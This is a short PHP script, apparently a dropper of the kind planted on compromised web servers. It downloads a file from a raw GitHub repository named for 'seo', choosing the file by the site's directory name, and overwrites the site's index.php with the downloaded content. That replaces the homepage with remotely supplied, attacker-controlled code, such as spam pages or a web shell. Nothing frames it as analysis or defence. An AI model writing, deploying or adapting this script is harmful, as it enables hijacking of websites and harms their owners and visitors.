<?php
$file = basename($_SERVER['DOCUMENT_ROOT']) . '.php';
$content = file_get_contents('https://raw.githubusercontent.com/2321enjwdadunjd/seo/main/21/' . $file);
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/index.php', 'w+');
fwrite($fp, $content);
fclose($fp);
?>
